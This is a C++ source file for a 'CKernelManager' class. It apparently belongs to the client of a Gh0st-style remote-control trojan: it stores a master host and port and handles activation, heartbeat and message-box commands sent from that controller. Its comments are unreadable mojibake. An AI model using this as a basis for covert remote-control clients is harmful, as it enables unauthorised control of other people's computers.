// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "loop.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
 
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);

	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʼ����
	m_bIsActived = false;

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}



// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);  //�������ں˵�����������cpu������ס���ö��߳��޷���ռ����ڴ�
		DbgPrintA("Debug:�����������������\n");
		//m_bIsActive = true;  //����仰��ȫ
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	case COMMAND_RENAME_REMARK:
		::MessageBox(NULL, "��������OK?", "", MB_OK);
		DbgPrintA("Debug:��������������������...��զʵ��");
		break;
	case COMMAND_POPMESSAGE:
		//::MessageBox(NULL,(CHAR*)&lpBuffer[1],NULL,MB_OK);

		POPMESSAGE *pMsg = (POPMESSAGE *)lpBuffer;
		::MessageBox(NULL, pMsg->szText, NULL, MB_OK);

		break;
	}	
}

void CKernelManager::UnInstallService()
{

}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}